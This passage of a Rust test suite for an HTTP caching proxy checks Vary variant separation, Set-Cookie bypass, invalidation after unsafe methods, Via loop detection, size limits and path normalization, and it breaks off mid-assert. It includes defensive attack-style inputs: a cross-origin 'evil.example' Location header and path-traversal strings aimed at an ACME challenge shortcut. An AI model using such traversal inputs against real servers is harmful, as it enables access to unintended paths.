//! Tests for how the cache treats `Vary` (RFC 9111 §4.1, #445), end to end: the real
//! `process_request` in front of an in-process origin that ECHOES the request headers
//! it was sent in the body, so serving one client another client's variant is visible
//! as a wrong body, not just a wrong counter.
//!
//! The first group holds for any implementation and is the safety net: two requests
//! that differ in a header the origin varies on must never be answered with each
//! other's response. The second group (added with the secondary key) pins the
//! positive behaviour: same variant → hit, different variant → its own entry.

use crate::config::ZionConfig;
use crate::dispatch::process_request;
use crate::http_util::ZionBody;
use crate::state::AppState;
use bytes::Bytes;
use http_body_util::{BodyExt, Full};
use hyper::{Method, Request, Response, StatusCode};
use hyper_util::rt::TokioIo;
use std::net::SocketAddr;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

struct Origin {
    /// The port this origin listens on (set once it is bound).
    port: std::sync::atomic::AtomicU16,
    /// The `Vary` value the origin sends (empty = none).
    vary: Mutex<String>,
    /// Requests that reached the origin.
    hits: AtomicUsize,
    /// The `Cache-Control` the origin sends.
    cc: Mutex<String>,
    /// `Accept-Language` of the last request the origin saw (None if absent).
    last_lang: Mutex<Option<String>>,
    /// A `Set-Cookie` value the origin adds to its answers, if any.
    set_cookie: Mutex<Option<String>>,
    /// Path and query of the last request the origin saw.
    last_target: Mutex<Option<String>>,
    /// Every header (lower-case name, value) of the last request the origin saw.
    last_headers: Mutex<Vec<(String, String)>>,
    /// Every `Via` value of the last request the origin saw, joined with ", ".
    last_via: Mutex<Option<String>>,
    /// When set, the body is this many `x` bytes; the bool = send it chunked (no
    /// Content-Length) instead of with a declared length.
    big: Mutex<Option<(usize, bool)>>,
    /// Delay before answering, in ms.
    delay_ms: std::sync::atomic::AtomicU64,
    /// The status the origin answers with (200 unless a test says otherwise).
    status: std::sync::atomic::AtomicU16,
    /// An extra response header (name, value), e.g. `Content-Location`.
    extra: Mutex<Option<(String, String)>>,
    /// Answer `Content-Encoding: gzip` (with no `Vary`) to a request whose `Accept-Encoding`
    /// mentions gzip, identity otherwise: the misbehaving origin the per-encoding key guards.
    gzip_if_accepted: std::sync::atomic::AtomicBool,
}

/// `lang|foo|cookie|ae` of the request, so a body identifies who it was made for.
async fn start_origin(o: Arc<Origin>) -> u16 {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tokio::spawn(async move {
        loop {
            let Ok((stream, _)) = listener.accept().await else {
                return;
            };
            let o = o.clone();
            tokio::spawn(async move {
                let svc = hyper::service::service_fn(move |req: Request<hyper::body::Incoming>| {
                    let o = o.clone();
                    async move {
                        o.hits.fetch_add(1, Ordering::Relaxed);
                        let d = o.delay_ms.load(Ordering::Relaxed);
                        if d > 0 {
                            tokio::time::sleep(Duration::from_millis(d)).await;
                        }
                        *o.last_headers.lock().unwrap() = req
                            .headers()
                            .iter()
                            .map(|(k, v)| {
                                (k.as_str().to_string(), v.to_str().unwrap_or("").to_string())
                            })
                            .collect();
                        *o.last_target.lock().unwrap() =
                            req.uri().path_and_query().map(|p| p.as_str().to_string());
                        *o.last_via.lock().unwrap() = {
                            let v: Vec<&str> = req
                                .headers()
                                .get_all("via")
                                .iter()
                                .filter_map(|x| x.to_str().ok())
                                .collect();
                            (!v.is_empty()).then(|| v.join(", "))
                        };
                        *o.last_lang.lock().unwrap() = req
                            .headers()
                            .get("accept-language")
                            .and_then(|v| v.to_str().ok())
                            .map(str::to_string);
                        let h = |n: &str| {
                            req.headers()
                                .get(n)
                                .and_then(|v| v.to_str().ok())
                                .map(|v| format!("<{v}>"))
                                .unwrap_or_else(|| "-".into())
                        };
                        let body = format!(
                            "{}|{}|{}|{}",
                            h("accept-language"),
                            h("x-foo"),
                            h("cookie"),
                            h("accept-encoding")
                        );
                        let mut b = Response::builder()
                            .status(StatusCode::from_u16(o.status.load(Ordering::Relaxed)).unwrap())
                            .header("cache-control", o.cc.lock().unwrap().clone());
                        if let Some((k, v)) = o.extra.lock().unwrap().clone() {
                            b = b.header(k, v);
                        }
                        if o.gzip_if_accepted.load(Ordering::Relaxed)
                            && req
                                .headers()
                                .get("accept-encoding")
                                .and_then(|v| v.to_str().ok())
                                .is_some_and(|v| v.contains("gzip"))
                        {
                            b = b.header("content-encoding", "gzip");
                        }
                        if let Some(c) = o.set_cookie.lock().unwrap().clone() {
                            b = b.header("set-cookie", c);
                        }
                        let vary = o.vary.lock().unwrap().clone();
                        if !vary.is_empty() {
                            b = b.header("vary", vary);
                        }
                        let body: http_body_util::combinators::BoxBody<
                            Bytes,
                            std::convert::Infallible,
                        > = match *o.big.lock().unwrap() {
                            Some((n, true)) => {
                                // chunked: 64 KiB frames, no declared length
                                let frames = (0..n.div_ceil(65536)).map(move |i| {
                                    let len = 65536.min(n - i * 65536);
                                    Ok::<_, std::convert::Infallible>(hyper::body::Frame::data(
                                        Bytes::from(vec![b'x'; len]),
                                    ))
                                });
                                http_body_util::StreamBody::new(tokio_stream::iter(frames)).boxed()
                            }
                            Some((n, false)) => Full::new(Bytes::from(vec![b'x'; n])).boxed(),
                            None => Full::new(Bytes::from(body)).boxed(),
                        };
                        Ok::<_, std::convert::Infallible>(b.body(body).unwrap())
                    }
                });
                let _ = hyper::server::conn::http1::Builder::new()
                    .serve_connection(TokioIo::new(stream), svc)
                    .await;
            });
        }
    });
    port
}

fn state_for(port: u16) -> Arc<AppState> {
    state_for_with(port, "")
}

/// The test config: a catch-all `static_cache` route to the origin on `port`;
/// `profile_extra` is appended to `[cache_profile.c]`.
fn cfg_for(port: u16, profile_extra: &str) -> ZionConfig {
    let toml = format!(
        r#"
[server]
listen_http = "127.0.0.1:0"
listen_https = "127.0.0.1:0"

[tls]
cert_path = "/c"
key_path = "/k"

[upstreams]
o = "http://127.0.0.1:{port}"

[cache_profile.c]
ttl_seconds = 3600
max_entries = 100
{profile_extra}

[[route]]
path = "/{{*rest}}"
upstream = "o"
mode = "static_cache"
cache_profile = "c"
"#
    );
    toml::from_str::<ZionConfig>(&toml).expect("config parses")
}

fn state_for_with(port: u16, profile_extra: &str) -> Arc<AppState> {
    AppState::for_tests(&cfg_for(port, profile_extra))
}

async fn rig(vary: &str) -> (Arc<Origin>, Arc<AppState>) {
    rig_cc(vary, "public, max-age=60").await
}

/// An origin plus a state whose cache profile has `max_object_mb = limit_mb`.
async fn rig_limit(limit_mb: u64) -> (Arc<Origin>, Arc<AppState>) {
    rig_with(
        "",
        "public, max-age=60",
        &format!("max_object_mb = {limit_mb}"),
    )
    .await
}

async fn rig_cc(vary: &str, cc: &str) -> (Arc<Origin>, Arc<AppState>) {
    rig_with(vary, cc, "").await
}

async fn rig_with(vary: &str, cc: &str, profile_extra: &str) -> (Arc<Origin>, Arc<AppState>) {
    let o = Arc::new(Origin {
        port: std::sync::atomic::AtomicU16::new(0),
        vary: Mutex::new(vary.into()),
        hits: AtomicUsize::new(0),
        cc: Mutex::new(cc.into()),
        last_lang: Mutex::new(None),
        set_cookie: Mutex::new(None),
        last_via: Mutex::new(None),
        last_target: Mutex::new(None),
        last_headers: Mutex::new(Vec::new()),
        big: Mutex::new(None),
        delay_ms: std::sync::atomic::AtomicU64::new(0),
        status: std::sync::atomic::AtomicU16::new(200),
        extra: Mutex::new(None),
        gzip_if_accepted: std::sync::atomic::AtomicBool::new(false),
    });
    let port = start_origin(o.clone()).await;
    o.port.store(port, Ordering::Relaxed);
    (o, state_for_with(port, profile_extra))
}

fn get(uri: &str, headers: &[(&str, &str)]) -> Request<ZionBody> {
    let mut b = Request::builder().method(Method::GET).uri(uri);
    for (k, v) in headers {
        b = b.header(*k, *v);
    }
    b.body(Full::new(Bytes::new()).map_err(|n| match n {}).boxed())
        .unwrap()
}

/// Send a request with `method` and return the status.
async fn send(st: &Arc<AppState>, method: Method, uri: &str) -> u16 {
    let mut b = Request::builder().method(method).uri(uri);
    b = b.header("accept-language", "de");
    let req = b
        .body(Full::new(Bytes::new()).map_err(|n| match n {}).boxed())
        .unwrap();
    process_request(
        req,
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap()
    .status()
    .as_u16()
}

/// (X-Zion-Cache, body)
async fn fetch(st: &Arc<AppState>, uri: &str, headers: &[(&str, &str)]) -> (String, String) {
    let resp = process_request(
        get(uri, headers),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    let cache = resp
        .headers()
        .get("x-zion-cache")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_string();
    let body = String::from_utf8(
        resp.into_body()
            .collect()
            .await
            .unwrap()
            .to_bytes()
            .to_vec(),
    )
    .unwrap();
    (cache, body)
}

/// Let the tee finish storing whatever it is going to store.
async fn settle() {
    tokio::time::sleep(Duration::from_millis(150)).await;
}

// ── safety: never another client's variant ──────────────────────────────────

/// For every `Vary` the origin might send, a client must only ever receive the body
/// the origin made for ITS request headers, however many times and in whatever order
/// the clients arrive, and whether or not the cache chooses to store the response.
#[tokio::test]
async fn no_client_ever_receives_another_clients_variant() {
    type Headers = &'static [(&'static str, &'static str)];
    let cases: &[(&str, &str, Headers, Headers)] = &[
        (
            "Accept-Language",
            "/l",
            &[("accept-language", "de")],
            &[("accept-language", "fr")],
        ),
        (
            "accept-language, x-foo",
            "/m",
            &[("accept-language", "de"), ("x-foo", "1")],
            &[("accept-language", "de"), ("x-foo", "2")],
        ),
        (
            "Cookie",
            "/c",
            &[("cookie", "s=alice")],
            &[("cookie", "s=bob")],
        ),
        ("*", "/s", &[("x-foo", "a")], &[("x-foo", "b")]),
        ("X-Foo", "/x", &[("x-foo", "a")], &[]),
        ("X-Foo", "/y", &[], &[("x-foo", "")]),
    ];
    for (vary, uri, a, b) in cases {
        let (_o, st) = rig(vary).await;
        for round in 0..3 {
            for (who, hdrs) in [("A", a), ("B", b)] {
                let (_, body) = fetch(&st, uri, hdrs).await;
                settle().await;
                for (k, v) in hdrs.iter() {
                    assert!(
                        body.contains(&format!("<{v}>")),
                        "Vary: {vary}, {uri}, round {round}, client {who} sent {k}: {v:?} but got {body:?}"
                    );
                }
                if hdrs.is_empty() {
                    assert!(
                        body.starts_with("-|-|-"),
                        "Vary: {vary}, {uri}, client {who} sent nothing: {body:?}"
                    );
                }
            }
        }
    }
}

/// `Accept-Encoding` has always been part of the key: a client that refuses gzip is
/// never handed the body made for one that accepts it.
#[tokio::test]
async fn accept_encoding_variants_do_not_cross() {
    let (_o, st) = rig("Accept-Encoding").await;
    let (_, gz) = fetch(&st, "/e", &[("accept-encoding", "gzip")]).await;
    settle().await;
    let (_, plain) = fetch(&st, "/e", &[("accept-encoding", "identity")]).await;
    settle().await;
    assert!(gz.ends_with("<gzip>"), "{gz}");
    assert!(plain.ends_with("<identity>"), "{plain}");
    let (_, gz2) = fetch(&st, "/e", &[("accept-encoding", "gzip")]).await;
    assert!(gz2.ends_with("<gzip>"), "{gz2}");
}

// ── behaviour: a secondary key per variant ──────────────────────────────────

fn hits(o: &Origin) -> usize {
    o.hits.load(Ordering::Relaxed)
}

#[tokio::test]
async fn each_variant_is_cached_under_its_own_key() {
    let (o, st) = rig("Accept-Language").await;
    let de = [("accept-language", "de")];
    let fr = [("accept-language", "fr")];

    let (c, b) = fetch(&st, "/v", &de).await;
    assert_eq!((c.as_str(), b.starts_with("<de>")), ("MISS", true));
    settle().await;
    let (c, b) = fetch(&st, "/v", &de).await;
    assert_eq!(
        (c.as_str(), b.starts_with("<de>")),
        ("HIT", true),
        "same variant is served from cache"
    );
    assert_eq!(hits(&o), 1);

    let (c, b) = fetch(&st, "/v", &fr).await;
    assert_eq!(
        (c.as_str(), b.starts_with("<fr>")),
        ("MISS", true),
        "a different variant is not the cached one"
    );
    settle().await;
    assert_eq!(hits(&o), 2);

    // both now hit, each with its own body, and the origin is not asked again
    for _ in 0..3 {
        let (c, b) = fetch(&st, "/v", &de).await;
        assert_eq!((c.as_str(), b.starts_with("<de>")), ("HIT", true));
        let (c, b) = fetch(&st, "/v", &fr).await;
        assert_eq!((c.as_str(), b.starts_with("<fr>")), ("HIT", true));
    }
    assert_eq!(hits(&o), 2);

    // a variant nobody has asked for yet, and "no header at all", are their own entries
    let (c, b) = fetch(&st, "/v", &[]).await;
    assert_eq!((c.as_str(), b.starts_with("-|")), ("MISS", true));
    settle().await;
    let (c, _) = fetch(&st, "/v", &[]).await;
    assert_eq!(c, "HIT");
}

#[tokio::test]
async fn an_absent_header_and_an_empty_one_are_different_variants() {
    let (o, st) = rig("X-Foo").await;
    let (_, none) = fetch(&st, "/ae", &[]).await;
    settle().await;
    let (c, empty) = fetch(&st, "/ae", &[("x-foo", "")]).await;
    settle().await;
    assert_eq!(
        c, "MISS",
        "an empty X-Foo must not be answered with the no-X-Foo entry"
    );
    assert!(
        none.contains("|-|") && empty.contains("|<>|"),
        "{none} / {empty}"
    );
    assert_eq!(hits(&o), 2);
}

#[tokio::test]
async fn per_user_vary_is_still_never_stored() {
    for (n, vary) in ["Cookie", "*", "Accept-Language, Authorization"]
        .iter()
        .enumerate()
    {
        let (o, st) = rig(vary).await;
        // a path of its own per case: the route cache is thread-local and keyed by path
        let uri = format!("/u{n}");
        for _ in 0..3 {
            let (c, _) = fetch(&st, &uri, &[("cookie", "s=1")]).await;
            assert_eq!(c, "BYPASS", "Vary: {vary}");
            settle().await;
        }
        assert_eq!(
            hits(&o),
            3,
            "Vary: {vary}: every request must reach the origin"
        );
    }
}

#[tokio::test]
async fn the_number_of_variants_per_key_is_bounded() {
    let (o, st) = rig("X-Foo").await;
    let cap = crate::vary::MAX_VARIANTS_PER_KEY;
    for i in 0..cap + 4 {
        let v = format!("v{i}");
        let (_, body) = fetch(&st, "/cap", &[("x-foo", v.as_str())]).await;
        assert!(body.contains(&format!("<{v}>")), "{body}");
        settle().await;
    }
    // the first `cap` are cached; the extra ones are served but not stored
    let before = hits(&o);
    for i in 0..cap {
        let v = format!("v{i}");
        let (c, _) = fetch(&st, "/cap", &[("x-foo", v.as_str())]).await;
        assert_eq!(c, "HIT", "variant {i} within the cap");
    }
    assert_eq!(hits(&o), before);
    let (c, _) = fetch(&st, "/cap", &[("x-foo", "v-last")]).await;
    assert_eq!(c, "BYPASS", "a variant over the cap is not stored");
    assert!(
        crate::metrics::METRICS
            .cache_vary_uncached
            .load(Ordering::Relaxed)
            > 0
    );
}

#[tokio::test]
async fn changing_the_vary_header_replaces_the_rule_without_mixing_variants() {
    let (o, st) = rig("Accept-Language").await;
    fetch(&st, "/chg", &[("accept-language", "de")]).await;
    settle().await;
    *o.vary.lock().unwrap() = "X-Foo".into();
    // the stored entry is still keyed on Accept-Language until it is refetched; purge to force it
    st.static_cache.purge_all();
    let (_, b1) = fetch(&st, "/chg", &[("x-foo", "a"), ("accept-language", "de")]).await;
    settle().await;
    let (c, b2) = fetch(&st, "/chg", &[("x-foo", "b"), ("accept-language", "de")]).await;
    assert_eq!(c, "MISS", "now keyed on X-Foo, so 'b' is not 'a'");
    assert!(b1.contains("|<a>|") && b2.contains("|<b>|"), "{b1} / {b2}");
}

#[tokio::test]
async fn an_origin_that_stops_varying_goes_back_to_one_shared_entry() {
    let (o, st) = rig("Accept-Language").await;
    fetch(&st, "/stop", &[("accept-language", "de")]).await;
    settle().await;
    *o.vary.lock().unwrap() = String::new();
    st.static_cache.purge_all();
    fetch(&st, "/stop", &[("accept-language", "de")]).await; // stored under the primary key
    settle().await;
    let (c, _) = fetch(&st, "/stop", &[("accept-language", "fr")]).await;
    assert_eq!(c, "HIT", "no Vary any more: one entry serves everyone");
}

#[tokio::test]
async fn simultaneous_first_requests_for_different_variants_each_get_their_own() {
    let (_o, st) = rig("Accept-Language").await;
    let (a, b) = tokio::join!(
        fetch(&st, "/par", &[("accept-language", "de")]),
        fetch(&st, "/par", &[("accept-language", "fr")]),
    );
    assert!(a.1.starts_with("<de>"), "{}", a.1);
    assert!(b.1.starts_with("<fr>"), "{}", b.1);
    settle().await;
    let (c1, b1) = fetch(&st, "/par", &[("accept-language", "de")]).await;
    let (c2, b2) = fetch(&st, "/par", &[("accept-language", "fr")]).await;
    assert!(b1.starts_with("<de>") && b2.starts_with("<fr>"));
    assert_eq!((c1.as_str(), c2.as_str()), ("HIT", "HIT"));
}

#[tokio::test]
async fn purging_a_prefix_removes_the_variants_under_it() {
    let (o, st) = rig("Accept-Language").await;
    fetch(&st, "/pg/a", &[("accept-language", "de")]).await;
    settle().await;
    assert!(st.static_cache.purge_prefix("/pg/a") >= 1);
    let (c, _) = fetch(&st, "/pg/a", &[("accept-language", "de")]).await;
    assert_eq!(c, "MISS");
    assert_eq!(hits(&o), 2);
}

#[tokio::test]
async fn a_stale_variant_is_refreshed_as_itself() {
    let (o, st) = rig_cc(
        "Accept-Language",
        "public, max-age=1, stale-while-revalidate=30",
    )
    .await;
    fetch(&st, "/sw", &[("accept-language", "de")]).await;
    settle().await;
    fetch(&st, "/sw", &[("accept-language", "fr")]).await;
    settle().await;
    tokio::time::sleep(Duration::from_millis(1300)).await;

    let (c, b) = fetch(&st, "/sw", &[("accept-language", "de")]).await;
    assert_eq!(c, "STALE-WHILE-REVALIDATE");
    assert!(b.starts_with("<de>"), "{b}");
    settle().await;
    assert_eq!(
        o.last_lang.lock().unwrap().as_deref(),
        Some("de"),
        "the refresh must ask for the same variant it is refreshing"
    );
    // nobody's entry was overwritten with somebody else's body
    let (_, de) = fetch(&st, "/sw", &[("accept-language", "de")]).await;
    let (_, fr) = fetch(&st, "/sw", &[("accept-language", "fr")]).await;
    assert!(
        de.starts_with("<de>") && fr.starts_with("<fr>"),
        "{de} / {fr}"
    );
}

// ── Set-Cookie: a response that sets a cookie is personalised, never shared ──

/// The body of a response that starts a session can carry that session's data.
/// Headers are not replayed from the cache, but the BODY would be, to everyone.
#[tokio::test]
async fn a_response_that_sets_a_cookie_is_never_stored() {
    let (o, st) = rig("").await;
    *o.set_cookie.lock().unwrap() = Some("sid=alice; Path=/; HttpOnly".into());
    for _ in 0..3 {
        let (c, _) = fetch(&st, "/sc", &[]).await;
        assert_eq!(c, "BYPASS", "a Set-Cookie response must not be cached");
        settle().await;
    }
    assert_eq!(hits(&o), 3, "every request must reach the origin");
    assert!(
        st.static_cache.get("/sc\u{1f}\u{1c}").fresh().is_none(),
        "nothing is stored"
    );
}

/// Control: the same route without the cookie IS cached, so the test above fails for
/// the reason it claims and not because the harness cannot cache.
#[tokio::test]
async fn the_same_response_without_a_cookie_is_cached() {
    let (o, st) = rig("").await;
    fetch(&st, "/nc", &[]).await;
    settle().await;
    let (c, _) = fetch(&st, "/nc", &[]).await;
    assert_eq!(c, "HIT");
    assert_eq!(hits(&o), 1);
}

// ── RFC 9111 §4.4: a successful unsafe request invalidates what it may have changed ──

/// Warm `/items/1` (and a query variant), mutate it, and report whether the next GET
/// was served from cache (`HIT`) or had to be refetched.
async fn warm_then_mutate(
    tag: usize,
    method: Method,
    mutate_status: u16,
) -> (String, String, String) {
    // a path space of its own per call: the route cache is thread-local and keyed by path,
    // so reusing a path across states would send requests to an earlier state's origin
    let (p1, p1q, p10, pchild) = (
        format!("/t{tag}/items/1"),
        format!("/t{tag}/items/1?v=2"),
        format!("/t{tag}/items/10"),
        format!("/t{tag}/items/1/child"),
    );
    let (o, st) = rig("").await;
    fetch(&st, &p1, &[]).await;
    fetch(&st, &p1q, &[]).await;
    fetch(&st, &p10, &[]).await; // a different resource with a longer name
    fetch(&st, &pchild, &[]).await;
    settle().await;
    assert_eq!(fetch(&st, &p1, &[]).await.0, "HIT", "warm");
    o.status.store(mutate_status, Ordering::Relaxed);
    let got = send(&st, method, &p1).await;
    assert_eq!(
        got, mutate_status,
        "the mutation must actually reach this test's origin"
    );
    o.status.store(200, Ordering::Relaxed);
    settle().await;
    (
        fetch(&st, &p1, &[]).await.0,
        fetch(&st, &p1q, &[]).await.0,
        // neighbours that must NOT have been touched
        format!(
            "{}/{}",
            fetch(&st, &p10, &[]).await.0,
            fetch(&st, &pchild, &[]).await.0
        ),
    )
}

#[tokio::test]
async fn a_successful_unsafe_request_evicts_the_target_and_only_the_target() {
    for (n, m) in [Method::POST, Method::PUT, Method::PATCH, Method::DELETE]
        .into_iter()
        .enumerate()
    {
        let (target, with_query, neighbours) = warm_then_mutate(n, m.clone(), 200).await;
        assert_eq!(target, "MISS", "{m}: the target URI must be refetched");
        assert_eq!(with_query, "MISS", "{m}: its query variants too");
        assert_eq!(
            neighbours, "HIT/HIT",
            "{m}: /items/10 and /items/1/child must be left alone"
        );
    }
}

#[tokio::test]
async fn a_failed_unsafe_request_invalidates_nothing() {
    for (n, status) in [400u16, 403, 409, 500, 502].into_iter().enumerate() {
        let (target, _, _) = warm_then_mutate(10 + n, Method::POST, status).await;
        assert_eq!(
            target, "HIT",
            "a {status} answer changed nothing, so the entry stays"
        );
    }
}

#[tokio::test]
async fn safe_methods_do_not_invalidate() {
    for (n, m) in [Method::GET, Method::HEAD, Method::OPTIONS]
        .into_iter()
        .enumerate()
    {
        let (target, _, _) = warm_then_mutate(20 + n, m.clone(), 200).await;
        assert_eq!(target, "HIT", "{m} must not evict");
    }
}

#[tokio::test]
async fn location_and_content_location_of_the_response_are_invalidated_too() {
    for (n, header) in ["content-location", "location"].iter().enumerate() {
        let (o, st) = rig("").await;
        // a path of its own per case: the route cache is thread-local and keyed by path
        let (other, elsewhere, mutate) = (
            format!("/other{n}"),
            format!("/elsewhere{n}"),
            format!("/items/2{n}"),
        );
        fetch(&st, &other, &[]).await;
        fetch(&st, &elsewhere, &[]).await;
        settle().await;
        assert_eq!(fetch(&st, &other, &[]).await.0, "HIT");
        *o.extra.lock().unwrap() = Some((header.to_string(), other.clone()));
        send(&st, Method::POST, &mutate).await;
        *o.extra.lock().unwrap() = None;
        settle().await;
        assert_eq!(
            fetch(&st, &other, &[]).await.0,
            "MISS",
            "{header}: the named URI is invalidated"
        );
        assert_eq!(
            fetch(&st, &elsewhere, &[]).await.0,
            "HIT",
            "{header}: and nothing else"
        );
    }
}

#[tokio::test]
async fn a_location_on_another_origin_is_not_acted_on() {
    let (o, st) = rig("").await;
    fetch(&st, "/other", &[]).await;
    settle().await;
    *o.extra.lock().unwrap() = Some(("location".into(), "http://evil.example/other".into()));
    send(&st, Method::POST, "/items/3").await;
    *o.extra.lock().unwrap() = None;
    settle().await;
    assert_eq!(
        fetch(&st, "/other", &[]).await.0,
        "HIT",
        "a response must not be able to evict URIs of another origin's path space"
    );
}

// ── Via on what is forwarded ────────────────────────────────────────────────

#[tokio::test]
async fn forwarded_requests_name_this_proxy_in_via_and_keep_earlier_hops() {
    let (o, st) = rig("").await;
    fetch(&st, "/via1", &[]).await;
    assert_eq!(
        o.last_via.lock().unwrap().as_deref(),
        Some(format!("1.1 {}", crate::via::pseudonym()).as_str()),
        "no inbound Via: just this proxy"
    );
    fetch(&st, "/via2", &[("via", "1.0 edge")]).await;
    assert_eq!(
        o.last_via.lock().unwrap().as_deref(),
        Some(format!("1.0 edge, 1.1 {}", crate::via::pseudonym()).as_str()),
        "an earlier hop is kept, this proxy is appended"
    );
}

/// End to end: an upstream that points back at this very proxy. Without loop detection
/// the request would bounce forever; with it, the second pass is refused (508) and that
/// answer travels back to the client. Exactly two passes go through the pipeline.
#[tokio::test]
async fn an_upstream_that_points_back_at_the_proxy_is_cut_after_one_bounce() {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let st = state_for(port);
    let passes = Arc::new(AtomicUsize::new(0));
    {
        let (st, passes) = (st.clone(), passes.clone());
        tokio::spawn(async move {
            loop {
                let Ok((stream, _)) = listener.accept().await else {
                    return;
                };
                let (st, passes) = (st.clone(), passes.clone());
                tokio::spawn(async move {
                    let svc =
                        hyper::service::service_fn(move |req: Request<hyper::body::Incoming>| {
                            let (st, passes) = (st.clone(), passes.clone());
                            async move {
                                passes.fetch_add(1, Ordering::Relaxed);
                                // the "upstream" hands the request straight back to the proxy
                                process_request(
                                    req.map(|b| b.boxed()),
                                    st,
                                    "127.0.0.1:1".parse::<SocketAddr>().unwrap(),
                                    false,
                                )
                                .await
                            }
                        });
                    let _ = hyper::server::conn::http1::Builder::new()
                        .serve_connection(TokioIo::new(stream), svc)
                        .await;
                });
            }
        });
    }
    let resp = process_request(
        get("/loop", &[]),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    assert_eq!(
        resp.status().as_u16(),
        508,
        "the looping request is refused"
    );
    assert_eq!(
        passes.load(Ordering::Relaxed),
        1,
        "it went to the upstream once, not forever"
    );
}

// ── per-profile limit on the size of a cached object ────────────────────────

const MIB: usize = 1024 * 1024;

/// Bytes the client received and whether the response was served from/put in the cache.
async fn fetch_len(st: &Arc<AppState>, uri: &str) -> (String, usize) {
    let resp = process_request(
        get(uri, &[]),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    let cache = resp
        .headers()
        .get("x-zion-cache")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_string();
    let n = resp.into_body().collect().await.unwrap().to_bytes().len();
    (cache, n)
}

#[tokio::test]
async fn an_object_over_the_limit_is_streamed_whole_and_never_stored() {
    for (n, chunked) in [false, true].into_iter().enumerate() {
        let (o, st) = rig_limit(1).await;
        *o.big.lock().unwrap() = Some((2 * MIB + 5, chunked));
        let uri = format!("/big{n}");
        for _ in 0..2 {
            let (_, got) = fetch_len(&st, &uri).await;
            assert_eq!(
                got,
                2 * MIB + 5,
                "chunked={chunked}: the client must still receive every byte"
            );
            settle().await;
        }
        assert_eq!(
            hits(&o),
            2,
            "chunked={chunked}: nothing was stored, so both requests reached the origin"
        );
        assert!(st
            .static_cache
            .get(&format!("{uri}\u{1f}\u{1c}"))
            .fresh()
            .is_none());
    }
}

#[tokio::test]
async fn an_object_under_the_limit_is_cached() {
    for (n, chunked) in [false, true].into_iter().enumerate() {
        let (o, st) = rig_limit(1).await;
        *o.big.lock().unwrap() = Some((MIB / 2, chunked));
        let uri = format!("/small{n}");
        let (_, got) = fetch_len(&st, &uri).await;
        assert_eq!(got, MIB / 2);
        settle().await;
        let (c, got) = fetch_len(&st, &uri).await;
        assert_eq!((c.as_str(), got), ("HIT", MIB / 2), "chunked={chunked}");
        assert_eq!(hits(&o), 1);
    }
}

#[tokio::test]
async fn a_declared_length_over_the_limit_bypasses_before_buffering() {
    let (o, st) = rig_limit(1).await;
    *o.big.lock().unwrap() = Some((2 * MIB, false)); // Content-Length: 2 MiB
    let (c, got) = fetch_len(&st, "/declared").await;
    assert_eq!(got, 2 * MIB);
    assert_eq!(
        c, "BYPASS",
        "a declared oversized length is refused up front, not buffered then dropped"
    );
    assert_eq!(hits(&o), 1);
}

#[tokio::test]
async fn a_background_refresh_over_the_limit_leaves_the_old_entry_alone() {
    let (o, st) = rig_with(
        "",
        "public, max-age=1, stale-while-revalidate=30",
        "max_object_mb = 1",
    )
    .await;
    let (_, first) = fetch(&st, "/swr-big", &[]).await;
    settle().await;
    tokio::time::sleep(Duration::from_millis(1300)).await;
    *o.big.lock().unwrap() = Some((2 * MIB, true)); // the refresh would be oversize
    let (c, body) = fetch(&st, "/swr-big", &[]).await;
    assert_eq!(
        (c.as_str(), body.as_str()),
        ("STALE-WHILE-REVALIDATE", first.as_str())
    );
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    while hits(&o) < 2 {
        assert!(
            std::time::Instant::now() < deadline,
            "refresh never reached the origin"
        );
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    settle().await;
    let kept = match st.static_cache.get("/swr-big\u{1f}\u{1c}") {
        crate::cache::CacheLookup::Fresh(h) | crate::cache::CacheLookup::Stale(h) => h.body.len(),
        crate::cache::CacheLookup::Miss => 0,
    };
    assert_eq!(
        kept,
        first.len(),
        "the oversize refresh must not replace the stored body"
    );
}

// ── what the upstream is sent: the normalized path ──────────────────────────

#[tokio::test]
async fn the_upstream_is_sent_the_normalized_path_and_the_query_untouched() {
    for (n, (sent, want)) in [
        ("/a/./b//c/%41?x=1&y=%2e", "/a/b/c/A?x=1&y=%2e"),
        ("/n0/p/../q", "/n0/q"),
        ("/n1/%2e%2e/%2e%2e/r?k=v", "/r?k=v"),
        ("/n2/a%2Fb", "/n2/a%2Fb"),
        ("/n3/%7euser/", "/n3/~user/"),
    ]
    .into_iter()
    .enumerate()
    {
        let (o, st) = rig("").await;
        // the route cache is per thread and keyed by path: a state per case, a path per case
        let _ = n;
        fetch(&st, sent, &[]).await;
        assert_eq!(
            o.last_target.lock().unwrap().as_deref(),
            Some(want),
            "sent {sent}"
        );
    }
}

// ── the plaintext :80 handler routes and forwards on its own, so it normalizes too ──

async fn http80(st: &Arc<AppState>, uri: &str) -> (u16, String) {
    let resp = crate::handle_http(
        get(uri, &[("host", "example.test")]),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
    )
    .await
    .unwrap();
    let loc = resp
        .headers()
        .get("location")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_string();
    (resp.status().as_u16(), loc)
}

/// The ACME-fallback shortcut forwards `/.well-known/acme-challenge/*` straight to the
/// route's upstream. A path that only LOOKS like a challenge before normalization must not
/// take it: `/.well-known/acme-challenge/../../secret` is `/secret`.
#[tokio::test]
async fn the_acme_shortcut_on_port_80_cannot_be_used_to_reach_other_paths() {
    let (o, st) = rig("").await;
    // control: a real challenge path is forwarded
    let (status, _) = http80(&st, "/.well-known/acme-challenge/abc").await;
    assert_ne!(status, 301, "a challenge path is proxied, not redirected");
    assert_eq!(hits(&o), 1);
    assert_eq!(
